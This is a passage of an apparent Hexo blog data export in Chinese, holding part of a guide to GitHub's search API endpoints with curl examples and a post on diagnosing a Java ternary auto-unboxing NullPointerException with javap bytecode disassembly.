plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://api.github.com/search/code?q=addClass+in:file+language:js+repo:jquery/jquery</span><br></pre></td></tr></table></figure>\n\n<p><strong>接受匹配偏移</strong></p>\n<p>请求头中增加<code>Accept: application/vnd.github.v3.text-match+json</code>参数，将会在响应信息中额外接收到<code>text-matches</code>字段信息，text-matches是一组列表，列表内对象包含<code>object_url</code>、<code>object_type</code>、<code>property</code>、<code>fragment</code>、<code>matches</code>，它们用来表示查询字符串在代码中的匹配位置。<a href=\"https://developer.github.com/v3/search/#text-match-metadata\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<p><strong>注：在没有Authorization的情况下，存在必须指定[user|repo|org]中的一个参数限制</strong></p>\n<h3 id=\"3-搜索问题\"><a href=\"#3-搜索问题\" class=\"headerlink\" title=\"3. 搜索问题\"></a>3. 搜索问题</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /search/issues</span><br></pre></td></tr></table></figure>\n\n<p><strong>参数</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Type</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>q</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\"><strong>Required</strong>.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see <a href=\"https://developer.github.com/v3/search/#constructing-a-search-query\" target=\"_blank\" rel=\"noopener\">Constructing a search query</a>. See “<a href=\"https://help.github.com/articles/searching-issues-and-pull-requests/\" target=\"_blank\" rel=\"noopener\">Searching issues and pull requests</a>“ for a detailed list of qualifiers.</td>\n</tr>\n<tr>\n<td align=\"center\"><code>sort</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Sorts the results of your query by the number of <code>comments</code>, <code>reactions</code>, <code>reactions-+1</code>, <code>reactions--1</code>, <code>reactions-smile</code>, <code>reactions-thinking_face</code>, <code>reactions-heart</code>, <code>reactions-tada</code>, or <code>interactions</code>. You can also sort results by how recently the items were <code>created</code> or <code>updated</code>, Default: <a href=\"https://developer.github.com/v3/search/#ranking-search-results\" target=\"_blank\" rel=\"noopener\">best match</a></td>\n</tr>\n<tr>\n<td align=\"center\"><code>order</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Determines whether the first search result returned is the highest number of matches (<code>desc</code>) or lowest number of matches (<code>asc</code>). This parameter is ignored unless you provide <code>sort</code>. Default: <code>desc</code></td>\n</tr>\n<tr>\n<td align=\"center\">per_page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">max 100</td>\n</tr>\n<tr>\n<td align=\"center\">page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">1-based</td>\n</tr>\n</tbody></table>\n<p><strong>示例</strong></p>\n<p>查找最早的未解决的python问题</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://api.github.com/search/issues?q=windows+label:bug+language:python+state:open&amp;sort=created&amp;order=asc</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-搜索用户\"><a href=\"#4-搜索用户\" class=\"headerlink\" title=\"4. 搜索用户\"></a>4. 搜索用户</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /search/users</span><br></pre></td></tr></table></figure>\n\n<p><strong>参数</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Type</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>q</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\"><strong>Required</strong>.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see <a href=\"https://developer.github.com/v3/search/#constructing-a-search-query\" target=\"_blank\" rel=\"noopener\">Constructing a search query</a>. See “<a href=\"https://help.github.com/articles/searching-users/\" target=\"_blank\" rel=\"noopener\">Searching users</a>“ for a detailed list of qualifiers.</td>\n</tr>\n<tr>\n<td align=\"center\"><code>sort</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Sorts the results of your query by number of <code>followers</code> or <code>repositories</code>, or when the person <code>joined</code> GitHub. Default: <a href=\"https://developer.github.com/v3/search/#ranking-search-results\" target=\"_blank\" rel=\"noopener\">best match</a></td>\n</tr>\n<tr>\n<td align=\"center\"><code>order</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Determines whether the first search result returned is the highest number of matches (<code>desc</code>) or lowest number of matches (<code>asc</code>). This parameter is ignored unless you provide <code>sort</code>. Default: <code>desc</code></td>\n</tr>\n<tr>\n<td align=\"center\">per_page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">max 100</td>\n</tr>\n<tr>\n<td align=\"center\">page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">1-based</td>\n</tr>\n</tbody></table>\n<p><strong>示例</strong></p>\n<p>查询热门用户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://api.github.com/search/users?q=tom+repos:%3E42+followers:%3E1000</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-搜索主题\"><a href=\"#5-搜索主题\" class=\"headerlink\" title=\"5. 搜索主题\"></a>5. 搜索主题</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /search/topics</span><br></pre></td></tr></table></figure>\n\n<p><strong>参数</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Type</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>q</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\"><strong>Required</strong>. The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see <a href=\"https://developer.github.com/v3/search/#constructing-a-search-query\" target=\"_blank\" rel=\"noopener\">Constructing a search query</a>.</td>\n</tr>\n<tr>\n<td align=\"center\">per_page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">max 100</td>\n</tr>\n<tr>\n<td align=\"center\">page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">1-based</td>\n</tr>\n</tbody></table>\n<p><strong>示例</strong></p>\n<p>搜索精选的ruby有关的主题</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -H &apos;Accept: application/vnd.github.mercy-preview+json&apos; \\</span><br><span class=\"line\">&apos;https://api.github.com/search/topics?q=ruby+is:featured&apos;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-搜索标签\"><a href=\"#6-搜索标签\" class=\"headerlink\" title=\"6. 搜索标签\"></a>6. 搜索标签</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /search/labels</span><br></pre></td></tr></table></figure>\n\n<p><strong>参数</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Type</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>repository_id</code></td>\n<td align=\"center\"><code>integer</code></td>\n<td align=\"center\"><strong>Required</strong>.The id of the repository.</td>\n</tr>\n<tr>\n<td align=\"center\"><code>q</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\"><strong>Required</strong>.The search keywords. This endpoint does not accept qualifiers in the query. To learn more about the format of the query, see <a href=\"https://developer.github.com/v3/search/#constructing-a-search-query\" target=\"_blank\" rel=\"noopener\">Constructing a search query</a>.</td>\n</tr>\n<tr>\n<td align=\"center\"><code>sort</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Sorts the results of your query by when the label was <code>created</code> or <code>updated</code>. Default: <a href=\"https://developer.github.com/v3/search/#ranking-search-results\" target=\"_blank\" rel=\"noopener\">best match</a></td>\n</tr>\n<tr>\n<td align=\"center\"><code>order</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Determines whether the first search result returned is the highest number of matches (<code>desc</code>) or lowest number of matches (<code>asc</code>). This parameter is ignored unless you provide <code>sort</code>. Default: <code>desc</code></td>\n</tr>\n<tr>\n<td align=\"center\">per_page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">max 100</td>\n</tr>\n<tr>\n<td align=\"center\">page</td>\n<td align=\"center\">int</td>\n<td align=\"center\">1-based</td>\n</tr>\n</tbody></table>\n<p><strong>示例</strong></p>\n<p>在指定仓库查找<code>bug</code>、<code>defect</code>、<code>eenhancement</code>有关的标签</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -H &apos;Accept: application/vnd.github.symmetra-preview+json&apos; \\</span><br><span class=\"line\">&apos;https://api.github.com/search/labels?repository_id=64778136&amp;q=bug+defect+enhancement&apos;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"JAVAP 反汇编字节码案例","date":"2019-06-12T11:58:49.000Z","keywords":"javap, jvm","rId":"MB-19061201","_content":"\njavap 命令可将Java class文件反汇编为字节码，借助该命令可排查一些特殊的bug\n\n## bug案例问题介绍\n\n```\nMyTokenManager.MyTokenRenter tokenRenter = null;\n        MySearchCodeVo vo = null;\n        try {\n            tokenRenter = tokenManager.tryGetAvailableToken(GET_TOKEN_DELAY, MyTokenManager.RentType.SEARCH_CODE);\n            if (tokenRenter == null) {\n                return null;\n            }\n            MyToken token = tokenRenter.getToken();\n            vo = searchCodeList(keywords, scopes, page, perPage, token.getToken());\n            return vo;\n        } finally {\n            if (tokenRenter != null) {\n                tokenRenter.giveBackToken(vo != null ? vo.getRateLimitRemain() : 1,       \n                        vo != null ? vo.getRateLimitReset() : 0L, vo != null ? vo.getRetryAfter() : null);\n            }\n        }\n```\n\n上面代码运行，会出现偶现的NullPointerException，出现异常的代码位于`tokenRenter.giveBackToken(vo != null ? vo.getRateLimitRemain() : 1, vo != null ? vo.getRateLimitReset() : 0L, vo != null ? vo.getRetryAfter() : null)`，代码中涉及到的方法定义如下\n\n```\nvoid giveBackToken(Integer, Long, Integer);\nInteger getRateLimitRemain();\nLong getRateLimitReset();\nInteger getRetryAfter();\n```\n\n## 问题排查步骤\n\n使用javap命令对class文件进行反汇编，生成字节码\n\n```\njavap -c com.xxxx.xxxx.Myxxxx\n```\n\n得到字节码信息，字节码中相关代码如下\n\n```\n0: aconst_null\n       1: astore        5\n       3: aconst_null\n       4: astore        6\n       6: aload         4\n       8: ldc2_w        #122                // long 4000l\n      11: getstatic     #124                // Field com/xxx/service/im/MyTokenManager$RentType.SEARCH_CODE:Lcom/xxx/service/im/MyTokenManager$RentType;\n      14: invokevirtual #125                // Method com/xxx/service/im/MyTokenManager.tryGetAvailableToken:(JLcom/xxx/service/im/MyTokenManager$RentType;)Lcom/xxx/service/im/MyTokenManager$MyTokenRenter;\n      17: astore        5\n      19: aload         5\n      21: ifnonnull     94\n      24: aconst_null\n      25: astore        7\n      27: aload         5\n      29: ifnull        91\n      32: aload         5\n      34: aload         6\n      36: ifnull        50\n      39: aload         6\n      41: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;\n      44: invokevirtual #14                 // Method java/lang/Integer.intValue:()I\n      47: goto          51\n      50: iconst_1\n      51: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;\n      54: aload         6\n      56: ifnull        70\n      59: aload         6\n      61: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;\n      64: invokevirtual #51                 // Method java/lang/Long.longValue:()J\n      67: goto          71\n      70: lconst_0\n      71: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;\n      74: aload         6\n      76: ifnull        87\n      79: aload         6\n      81: invokevirtual #128                // Method com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;\n      84: goto          88\n      87: aconst_null\n      88: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V\n      91: aload         7\n      93: areturn\n      94: aload         5\n      96: invokevirtual #130                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.getToken:()Ljava/lang/Object;\n      99: checkcast     #131                // class com/xxx/store/vo/im/MyToken\n     102: astore        7\n     104: aload_0\n     105: aload_1\n     106: iload_2\n     107: iload_3\n     108: aload         7\n     110: invokevirtual #132                // Method com/xxx/store/vo/im/MyToken.getToken:()Ljava/lang/String;\n     113: invokestatic  #133                // Method searchCodeList:(Ljava/lang/String;Ljava/lang/String;IILjava/lang/String;)Lcom/xxx/store/vo/im/MySearchCodeVo;\n     116: astore        6\n     118: aload         6\n     120: astore        8\n     122: aload         5\n     124: ifnull        186\n     127: aload         5\n     129: aload         6\n     131: ifnull        145\n     134: aload         6\n     136: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;\n     139: invokevirtual #14                 // Method java/lang/Integer.intValue:()I\n     142: goto          146\n     145: iconst_1\n     146: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;\n     149: aload         6\n     151: ifnull        165\n     154: aload         6\n     156: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;\n     159: invokevirtual #51                 // Method java/lang/Long.longValue:()J\n     162: goto          166\n     165: lconst_0\n     166: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;\n     169: aload         6\n     171: ifnull        182\n     174: aload         6\n     176: invokevirtual #128                // Method com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;\n     179: goto          183\n     182: aconst_null\n     183: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V\n     186: aload         8\n     188: areturn\n     189: astore        9\n     191: aload         5\n     193: ifnull        255\n     196: aload         5\n     198: aload         6\n     200: ifnull        214\n     203: aload         6\n     205: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;\n     208: invokevirtual #14                 // Method java/lang/Integer.intValue:()I\n     211: goto          215\n     214: iconst_1\n     215: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;\n     218: aload         6\n     220: ifnull        234\n     223: aload         6\n     225: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;\n     228: invokevirtual #51                 // Method java/lang/Long.longValue:()J\n     231: goto          235\n     234: lconst_0\n     235: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;\n     238: aload         6\n     240: ifnull        251\n     243: aload         6\n     245: invokevirtual #128                // Method com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;\n     248: goto          252\n     251: aconst_null\n     252: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V\n     255: aload         9\n     257: athrow\n```\n\n注意字节码中的这几行代码\n\n![图片1](../static/MB19061201-1.png)\n\n\n\n发现`vo != null ? vo.getRateLimitRemain() : 1` 这个代码，会把`vo.getRateLimitRemain()`从Integer转成基础数据类型int，再转为Integer传给`giveBackToken`方法，而`vo != null ? vo.getRetryAfter() : null`这个代码，则不会转化为基础数据类型直接传给`giveBackToken`方法。说明了exp ? value1 : value2运算，value1和value2分别为基础数据类型和基础数据类型的包装类时，会统一转为基础数据类型。\n\n\n\n## 测试验证\n\n测试代码1：\n\n```\npublic static void main(String[] args) {\n    Tt tt = new Tt();\n    tt.m = 6;\n    test(tt != null ? tt.m : 2, tt != null ? tt.n : 6);\n}\n\npublic static class Tt {\n    Integer m;\n    Integer n;\n}\npublic static void test(Integer a, Integer b) {\n    System.out.println(a + \"--\" + b);\n}\n```\n\n运行结果为空指针异常\n\n\n\n测试代码2\n\n```\npublic static void main(String[] args) {\n    Tt tt = new Tt();\n    tt.m = 6;\n    test(tt != null ? tt.m : Integer.valueOf(2), tt != null ? tt.n : Integer.valueOf(6));\n}\n\npublic static class Tt {\n    Integer m;\n    Integer n;\n}\npublic static void test(Integer a, Integer b) {\n    System.out.println(a + \"--\" + b);\n}\n```\n\n正常输出结果：6--null\n\n\n","source":"_posts/2019-06-12_javap_demo.md","raw":"---\ntitle: JAVAP 反汇编字节码案例\ndate: 2019-06-12 19:58:49\ntags: java\npermalink: javap-example\nkeywords: javap, jvm\nrId: MB-19061201\n---\n\njavap 命令可将Java class文件反汇编为字节码，借助该命令可排查一些特殊的bug\n\n## bug案例问题介绍\n\n```\nMyTokenManager.MyTokenRenter tokenRenter = null;\n        MySearchCodeVo vo = null;\n        try {\n            tokenRenter = tokenManager.tryGetAvailableToken(GET_TOKEN_DELAY, MyTokenManager.RentType.SEARCH_CODE);\n            if (tokenRenter == null) {\n                return null;\n            }\n            MyToken token = tokenRenter.getToken();\n            vo = searchCodeList(keywords, scopes, page, perPage, token.getToken());\n            return vo;\n        } finally {\n            if (tokenRenter != null) {\n                tokenRenter.giveBackToken(vo != null ? vo.getRateLimitRemain() : 1,       \n                        vo != null ? vo.getRateLimitReset() : 0L, vo != null ? vo.getRetryAfter() : null);\n            }\n        }\n```\n\n上面代码运行，会出现偶现的NullPointerException，出现异常的代码位于`tokenRenter.giveBackToken(vo != null ? vo.getRateLimitRemain() : 1, vo != null ? vo.getRateLimitReset() : 0L, vo != null ? vo.getRetryAfter() : null)`，代码中涉及到的方法定义如下\n\n```\nvoid giveBackToken(Integer, Long, Integer);\nInteger getRateLimitRemain();\nLong getRateLimitReset();\nInteger getRetryAfter();\n```\n\n## 问题排查步骤\n\n使用javap命令对class文件进行反汇编，生成字节码\n\n```\njavap -c com.xxxx.xxxx.Myxxxx\n```\n\n得到字节码信息，字节码中相关代码如下\n\n```\n0: aconst_null\n       1: astore        5\n       3: aconst_null\n       4: astore        6\n       6: aload         4\n       8: ldc2_w        #122                // long 4000l\n      11: getstatic     #124                // Field com/xxx/service/im/MyTokenManager$RentType.SEARCH_CODE:Lcom/xxx/service/im/MyTokenManager$RentType;\n      14: invokevirtual #125                // Method com/xxx/service/im/MyTokenManager.tryGetAvailableToken:(JLcom/xxx/service/im/MyTokenManager$RentType;)Lcom/xxx/service/im/MyTokenManager$MyTokenRenter;\n      17: astore        5\n      19: aload         5\n      21: ifnonnull     94\n      24: aconst_null\n      25: astore        7\n      27: aload         5\n      29: ifnull        91\n      32: aload         5\n      34: aload         6\n      36: ifnull        50\n      39: aload         6\n      41: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;\n      44: invokevirtual #14                 // Method java/lang/Integer.intValue:()I\n      47: goto          51\n      50: iconst_1\n      51: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;\n      54: aload         6\n      56: ifnull        70\n      59: aload         6\n      61: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;\n      64: invokevirtual #51                 // Method java/lang/Long.longValue:()J\n      67: goto          71\n      70: lconst_0\n      71: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;\n      74: aload         6\n      76: ifnull        87\n      79: aload         6\n      81: invokevirtual #128                // Method com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;\n      84: goto          88\n      87: aconst_null\n      88: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V\n      91: aload         7\n      93: areturn\n      94: aload         5\n      96: invokevirtual #130                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.getToken:()Ljava/lang/Object;\n      99: checkcast     #131                // class com/xxx/store/vo/im/MyToken\n     102: astore        7\n     104: aload_0\n     105: aload_1\n     106: iload_2\n     107: iload_3\n     108: aload         7\n     110: invokevirtual #132                // Method com/xxx/store/vo/im/MyToken.getToken:()Ljava/lang/String;\n     113: invokestatic  #133                // Method searchCodeList:(Ljava/lang/String;Ljava/lang/String;IILjava/lang/String;)Lcom/xxx/store/vo/im/MySearchCodeVo;\n     116: astore        6\n     118: aload         6\n     120: astore        8\n     122: aload         5\n     124: ifnull        186\n     127: aload         5\n     129: aload         6\n     131: ifnull        145\n     134: aload         6\n     136: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;\n     139: invokevirtual #14                 // Method java/lang/Integer.intValue:()I\n     142: goto          146\n     145: iconst_1\n     146: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;\n     149: aload         6\n     151: ifnull        165\n     154: aload         6\n     156: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;\n     159: invokevirtual #51                 // Method java/lang/Long.longValue:()J\n     162: goto          166\n     165: lconst_0\n     166: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;\n     169: aload         6\n     171: ifnull        182\n     174: aload         6\n     176: invokevirtual #128                // Method com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;\n     179: goto          183\n     182: aconst_null\n     183: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V\n     186: aload         8\n     188: areturn\n     189: astore        9\n     191: aload         5\n     193: ifnull        255\n     196: aload         5\n     198: aload         6\n     200: ifnull        214\n     203: aload         6\n     205: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;\n     208: invokevirtual #14                 // Method java/lang/Integer.intValue:()I\n     211: goto          215\n     214: iconst_1\n     215: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;\n     218: aload         6\n     220: ifnull        234\n     223: aload         6\n     225: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;\n     228: invokevirtual #51                 // Method java/lang/Long.longValue:()J\n     231: goto          235\n     234: lconst_0\n     235: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;\n     238: aload         6\n     240: ifnull        251\n     243: aload         6\n     245: invokevirtual #128                // Method com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;\n     248: goto          252\n     251: aconst_null\n     252: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V\n     255: aload         9\n     257: athrow\n```\n\n注意字节码中的这几行代码\n\n![图片1](../static/MB19061201-1.png)\n\n\n\n发现`vo != null ? vo.getRateLimitRemain() : 1` 这个代码，会把`vo.getRateLimitRemain()`从Integer转成基础数据类型int，再转为Integer传给`giveBackToken`方法，而`vo != null ? vo.getRetryAfter() : null`这个代码，则不会转化为基础数据类型直接传给`giveBackToken`方法。说明了exp ? value1 : value2运算，value1和value2分别为基础数据类型和基础数据类型的包装类时，会统一转为基础数据类型。\n\n\n\n## 测试验证\n\n测试代码1：\n\n```\npublic static void main(String[] args) {\n    Tt tt = new Tt();\n    tt.m = 6;\n    test(tt != null ? tt.m : 2, tt != null ? tt.n : 6);\n}\n\npublic static class Tt {\n    Integer m;\n    Integer n;\n}\npublic static void test(Integer a, Integer b) {\n    System.out.println(a + \"--\" + b);\n}\n```\n\n运行结果为空指针异常\n\n\n\n测试代码2\n\n```\npublic static void main(String[] args) {\n    Tt tt = new Tt();\n    tt.m = 6;\n    test(tt != null ? tt.m : Integer.valueOf(2), tt != null ? tt.n : Integer.valueOf(6));\n}\n\npublic static class Tt {\n    Integer m;\n    Integer n;\n}\npublic static void test(Integer a, Integer b) {\n    System.out.println(a + \"--\" + b);\n}\n```\n\n正常输出结果：6--null\n\n\n","slug":"javap-example","published":1,"updated":"2020-01-30T06:20:04.817Z","_id":"ck5qhi073002lg0ukczko5nwf","comments":1,"layout":"post","photos":[],"link":"","content":"<p>javap 命令可将Java class文件反汇编为字节码，借助该命令可排查一些特殊的bug</p>\n<h2 id=\"bug案例问题介绍\"><a href=\"#bug案例问题介绍\" class=\"headerlink\" title=\"bug案例问题介绍\"></a>bug案例问题介绍</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MyTokenManager.MyTokenRenter tokenRenter = null;</span><br><span class=\"line\">        MySearchCodeVo vo = null;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            tokenRenter = tokenManager.tryGetAvailableToken(GET_TOKEN_DELAY, MyTokenManager.RentType.SEARCH_CODE);</span><br><span class=\"line\">            if (tokenRenter == null) &#123;</span><br><span class=\"line\">                return null;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            MyToken token = tokenRenter.getToken();</span><br><span class=\"line\">            vo = searchCodeList(keywords, scopes, page, perPage, token.getToken());</span><br><span class=\"line\">            return vo;</span><br><span class=\"line\">        &#125; finally &#123;</span><br><span class=\"line\">            if (tokenRenter != null) &#123;</span><br><span class=\"line\">                tokenRenter.giveBackToken(vo != null ? vo.getRateLimitRemain() : 1,       </span><br><span class=\"line\">                        vo != null ? vo.getRateLimitReset() : 0L, vo != null ? vo.getRetryAfter() : null);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面代码运行，会出现偶现的NullPointerException，出现异常的代码位于<code>tokenRenter.giveBackToken(vo != null ? vo.getRateLimitRemain() : 1, vo != null ? vo.getRateLimitReset() : 0L, vo != null ? vo.getRetryAfter() : null)</code>，代码中涉及到的方法定义如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void giveBackToken(Integer, Long, Integer);</span><br><span class=\"line\">Integer getRateLimitRemain();</span><br><span class=\"line\">Long getRateLimitReset();</span><br><span class=\"line\">Integer getRetryAfter();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"问题排查步骤\"><a href=\"#问题排查步骤\" class=\"headerlink\" title=\"问题排查步骤\"></a>问题排查步骤</h2><p>使用javap命令对class文件进行反汇编，生成字节码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javap -c com.xxxx.xxxx.Myxxxx</span><br></pre></td></tr></table></figure>\n\n<p>得到字节码信息，字节码中相关代码如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span 